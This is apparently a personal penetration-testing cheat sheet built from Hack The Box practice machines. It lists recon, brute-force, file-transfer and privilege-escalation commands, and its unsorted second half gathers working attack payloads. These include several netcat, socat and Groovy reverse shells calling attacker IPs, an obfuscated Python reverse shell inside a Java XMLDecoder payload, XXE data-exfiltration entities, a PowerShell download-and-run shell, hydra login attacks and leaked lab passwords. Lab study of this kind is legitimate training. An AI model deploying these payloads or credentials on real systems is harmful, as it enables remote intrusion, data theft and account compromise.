<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Useful Shit<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

_________________________


<span class="date">Last Updated: 26/Aug/2021</span> 


<br/> 

### <span class="useful_shit subtitle">Most Reliable Reverse Shell Payload  
  ```console
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
  ```

 <br/><br/> 

### <span class="useful_shit subtitle">Python Script That Spawns a Shell When connecting to a Reverse Shell  
```console
python -c 'import pty;pty.spawn("/bin/bash");'
```
  <br/><br/> 

### <span class="useful_shit subtitle">SQLMAP  
* So I'm taking the machine "Cronos" as my example here because it's the first time I use `sqlmap` in.
* We can enumerate the databases names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data='username=&password=' --method POST --dbs --batch
  ```
* In addition to the databases' names the previous line also provided me with the version of the SQL on the server. 
* `--batch` answers the questions for me with the default. 
<br/>
* We can also get the tables' names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data="username=&password=" --method POST -D [DATABASE NAME] --dump all --batch
  ```
* When using this command I also got the content of the admin table. 
* Sqlmap seems to use the SQLi vulneribility in the application to gain access to:
  * Determine the schema of the database (database, table and column names).
  * Dump data from tables.
  * Potentially upload or download files to the database server machine.
  * Perform out-of-band tests.
  * Dump usernames, password hashes, privileges and roles.
  * Pass hashes off to a password cracker for a dictionary attack.
  * Perform "blind" and "boolean-based" sql injection attacks (if the web application doesn't return any error messages then sqlmap is the most time-saving tool in this case).
  * Potentially even launch a remote shell on the database server.

 <br/><br/> 

### <span class="useful_shit subtitle">Robots.txt  

<blockquote>
The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.  
The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.
</blockquote>  

 <br/><br/> 


### <span class="useful_shit subtitle">DNS Zone Transfer  
* Definition?
  Is the process of copying the contents of the zone file on a primary DNS server to a secondary DNS server.  
  And this way fault tolerance is provided.

 <br/><br/> 

### <span class="useful_shit subtitle">Dirsearch  

* Check out <a href="https://github.com/maurosoria/dirsearch">this link</a> to git clone it.
* We can use it instead of Dirbuster or Gobuster.

 <br/><br/> 

### <span class="useful_shit subtitle">PrivEsc 😈


* `cat /etc/shells`   
* Shows me what shells the machine uses  



<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.

<br/>

* `/usr/share/exploitdb/exploits`
* ExploitDB's exploits are saved in this path.  

<br/>

* Tools we can use to make life easier  
* <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux-Smart-Enumeration</a> and <a href="https://github.com/DominicBreuker/pspy">Pspy</a>.  

<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  


 <br/><br/> 

### <span class="useful_shit subtitle">Searchsploit  

* `searchsploit -x [EXPLOIT PATH]`
* Can be used to view the exploit code.

<br/>

* `searchsploit -m [EXPLOIT PATH]`
* Copies the exploit to my working directory 😱.

<br/>

* People that name exploits sometimes name the versions wrongly. So, don't trusts the version in the name of the exploit.   

 <br/><br/> 

### <span class="useful_shit subtitle">Upgrading The Reverse Shell   

* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  

<br/>  

* Using Python for a psuedo terminal  
  ```console
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```  

* Using socat  WORKED INSTEAD OF `nc`
  ```console
  #Listener
  socat file:`tty`,raw,echo=0 tcp-listen:4444

  #Victim  
  socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
  ```  

* Using stty options NOT WORKING WITH ME  
  ```console
  # In reverse shell 
  python -c 'import pty; pty.spawn("/bin/bash")'
  ctrl-z  

  # In Kali 
  stty raw -echo  
  fg

  # In reverse shell
  reset
  export ShELL=bash
  export TERM=xterm-256color
  stty row <num> columns <cols>
  ```  
* If we type `stty -a` it will give me info and I can get the rows and columns from there.
* I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  

 <br/><br/> 

### <span class="useful_shit subtitle">sudo  

* It can be used to run commands as another user (root is one of them but not the only one). I think by default it runs as root and if I want to run as another user I can use `sudo -u [USERNAME] [COMMAND]`.


 <br/><br/> 

### <span class="useful_shit subtitle">SSH Keys  
* We can use ssh keys to privesc  

    ```console
    Shatha Barqawi@htb[/htb]$ vim id_rsa
    Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
    Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

    root@remotehost#
    ```  

* This ssh key can be found in the following path if I have access to it `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`.

    <blockquote>
    Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
    </blockquote>  

* We can also put our public key in the directory `/home/user/.ssh/authorized_keys` if we have the permissions to do so. How to do that?  

1. Create key on my machine 
   ```console
   Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
   ```
   * This will create two file `key` (which we will use with `ssh -i`) and `key.pub`(which we will copy to the remote machine).

 <br/><br/> 

### <span class="useful_shit subtitle">Transferring Files  

1. Using `wget`  
* We run a Python HTTP server on our machine and wget or cURL on the victim to download the file   

* On my machine
  ```console
  Shatha Barqawi@htb[/htb]$ cd /tmp
  Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000

  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  ```

* On victim  
  ```console
  user@remotehost$ wget http://10.10.14.1:8000/linenum.
  ```  
  OR   
  ```console
  user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
  ```  

2. Using `scp`  

   ```
   scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]
   ```

3. Using `base64`  
* In some cases, there might be firewall protections that prevent us from downloading a file from our machine. In such case we can use `base64` and encode the file into base64 format and then copy/paste the base64 string to the remote server and decode it there.   
  ```console
  Shatha Barqawi@htb[/htb]$ base64 shell -w 0
  ```  

  ```console
  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
  ```  

* To check that we didn't miss anything up during the encoding/deconding process we can use the command `md5sum [FILENAME]` on both machines and check if they're equal.  

 <br/><br/> 

### <span class="useful_shit subtitle">Nmap  

* We can use the option `-oA [FILE NAME]` to save the nmap output in a file in the working directory.
  ```console
  nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
  ``` 

 <br/><br/> 

### <span class="useful_shit subtitle">Web Testing  

* We can use the command `whatweb [IP ADDRESS]` to see info about the web server.

 <br/><br/> 

### <span class="useful_shit subtitle">Changing Process Priority with *nice*   

  ```console
  nice -n [niceness value] [command]
  ```
  * -ve value is most likely to receive priority.
  * +ve value is the least likely to receive priority.

 <br/><br/> 

### <span class="useful_shit subtitle">Environment Variables  

  * To view the contents of an env variable
    ```console
    echo $[ENV VAR]
    ```

  * For the change in  the contents of a variable to be for all we have to export it  
    ```console
    export [ENVE VAR]
    ```  


 <br/><br/> 

### <span class="useful_shit subtitle">MySQL  

  * To access mysql database on localhost we can use  
    ```
    mysql -u [USERNAME] -p
    ```  

  * To access the database remotely  
    ```
    mysql -u [USERNAME] -p [IP ADDRESS]
    ```  

  * In the default configuration of mysql the root user's password is *empty*.

  * Mysql's command prompt. Some of its commands

    ```console
    mysql> show databases;
    mysql> select * from [TABLE NAME];
    mysql> use [DATABASE NAME];
    mysql> show tables;
    ```

  * Mysql is a service that can be run on a computer and I can run it as follows
    ```console
    kali> service mysql start
    ```


 <br/><br/> 

### <span class="useful_shit subtitle"> Proxy Servers  

* We can obscure our traffic by using proxies.
* Specifically, in Kali Linux there's a command for proxying called *proxychains*  
  ```console
  kali> proxychains [THE COMMAND YOU WANT TO PROXY] [ARGUMENTS]
  ``` 
* The configurations of `proxychains` are stored in a config file `/etc/proxychains.conf`. We can edit this file to set a proxy for the `proxychains` command to use.


 <br/><br/> 

### <span class="useful_shit subtitle">BruteForcing

* <span class="useful_shit subtitle"> Hydra</span>
  * Hydra for SSH and FTP  
    ```console
    hydra -l [USER NAME] -p [PASSWORD] [IP ADDRESS] -t [NUMBER OF THREADS] [SSH OR FTP]
    ```
  * To use a usernames wordlist we can use the -L option and -P option for a wordlist of passwords.  

<br/> 

* <span class="useful_shit subtitle"> Gobuster Bruteforcing Directories and Subdomains 
  * Command to bruteforece in `DIR` mode  
    ```console
    gobuster dir -u [VICTIM'S LINK] -x [LIST OF EXTENSIONS] -w [WORDLIST PATH]
    ```  

  * Command to bruteforce `DNS` mode  
    ```console
    gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
    ```


* We can convert Hex to ASCII using the command `xxd`




## To Be re-written later  

hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f

hydra -l admin -P /home/kali/mywordlist ignition.htb http-port-form "/admin?form_key=uCAJwNW5TywTQ3U8&login%5Busername%5D=^USER^&login%5Bpassword%5D=^PASS^"

gobuster dir -u 10.129.159.48 -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt

* If I need to exclude a status code because an error like this is encountered you can use the flag `-b` and then put the status codes you want to blacklist or `-s` and put the status codes you want to whitelist. Like this:  
```
gobuster dir -u http://10.129.159.48:8080/ -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt -b "403,404" 
```


* What does versions of software mean?   

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Semver.jpg/440px-Semver.jpg">  


* Groovy Script   
Groovy is a scripting language with Java-like syntax for the Java platform

* XBruteForcer to bruteforce certain CRMs?

* BruteX to bruteforce passwords.

* Hydra example (Not sure of functionality just yet)   
```
$ hydra -l admin -P /home/kali/Documents/cloned_reps/SecLists/Passwords/2020-200_most_used_passwords.txt -vV -f -t 5 10.129.157.36 http-post-form "/\\login:j_username=^USER^&j_password=^PASS^:loginError"

```

* Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:

```groovy
String host="10.10.15.82";
int port=1234;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* What is SMB?  
<blockquote>
The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. It can also carry transaction protocols for interprocess communication. Over the years, SMB has been used primarily to connect Windows computers, although most other systems -- such as Linux and macOS -- also include client components for connecting to SMB resources.
</blockquote>

* How to use smbclient to view available shares:  
```
smbclient -L \\\\10.129.158.38 -U 'administrator'
```

* To access a share just remove the `-L` and specify the name of the share:  
```
smbclient \\\\10.129.158.38\\ADMIN$ -U 'administrator'
```

* The `$` means that this share is an administrative share.  

* We can use the command `get` inside the smb prompt to download files on our own box.

* `xp_cmdshell` allows me to spawn a Windows shell.

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc

M3g4c0rp123

-OutFile c:\\Users\Public\\winPEASany.exe

* grep substitute in Windows `C:\> netstat -na | findstr /c:"PORT"`

* To view hidden file in Windows `dir [DIR NAME] /a:h /b /s`

dir /a:h /b /s

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.189 3001


* Oopsie  

* Why I got stuck? 
  * I didn't think of changing the id in the url I kept trying to guess the Access ID when in reality I could access it by decreasing the id in the url when I'm viewing the access ID of the guest user. 


rm /tmp/f;mkfifo /tmp/f;/bin/cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f


* `find directory-location -group {group-name} -name {file-name}` this syntax is used to find the files that belong to the group specified.

* SUID (Set owner User ID)

* Add new path to the $PATH variable 
 `export PATH=/some/new/path:$PATH`

export PATH=/tmp:$PATH

af13b0bee69f8a877c3faf667f7beacf

* Why does UDP nmap take forever?  
  <blockquote>
  UDP scanning is likely to be slower than TCP due to the differences in how the protocol works (i.e. with TCP it's easier to establish that a port is open due to the three-way handshake).
  </blockquote>


* UDP nmap results  

```
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp  
```


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f 



<?xml version="1.0" encoding="UTF-8"?>
<java>
	<object class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="2" >
			<void index="0"> 
				<string>cmd.exe</string>								
			</void>		
			<void index="1"> 
				<string>C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
</string>									
			</void>		
		</array>		
		<void method="start"/>
	</object> 	
</java>	

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/xmlShell.xml"> ]>

C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
	
	
	

* Nmap results

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

* Banner Grab  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* So the problem was with the certificate. When I use `xfreerdp /v:[IP ADDRESS] /cert:ignore /u:Administrator`. 
* First off, we use Administrator instead of root in Windows machines.
* Second, I should've looked more into the flags or switches or whatever they call them. Anyway, it wouldn't have occured to me that I have to ignore the cert or that this was an option or that if I put it it will be functional.

```
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[03:25:50:883] [2009:2010] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion

```


PLEASE COMBINE THIS FILE WITH HELPFUL SHIT   

* we can copy the request into a file and then put the file in `sqlmap` as follows if we're suspecting an sql injection  

```console
sqlmap -r [FILE NAME]
```

* We can also use the switch/option/flag `--os-shell` to get a shell from the sql injection.



rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f

socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.10.15.189:4444

python3 -c 'import pty;pty.spawn("/bin/bash")'

P@s5w0rd!

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh
:shell

* To scan for UDP ports with nmap write the following `sudo nmap -Pn -sV -sU 10.129.126.250 `

* `.htpasswd` this file is used for basic HTTP authentication.
* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
mike:Sheffield19


tftp 10.129.132.172 -m binary -c put revShell.php revShell.php

* It seems like I will be making a container so that I can open it with root privilege.  

[[Linux]]
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/test2.php"> ]>
	
	<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>

<!ENTITY xxe SYSTEM "https://10.10.15.189/test.php">]><foo>&xxe;</foo>
	
	
	
	<!DOCTYPE root [<!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//10.10.15.189/WhatEver">]>
	
<root><name>test</name><tel>021212</tel><email>&steal;</email><password>pwd</password></root>‌
	
	
	* Try to use the repeater in Burp suite it save sooo much time
	* How to use rsa id to ssh  
	
	ssh -i id_rsa daniel@10.129.140.196
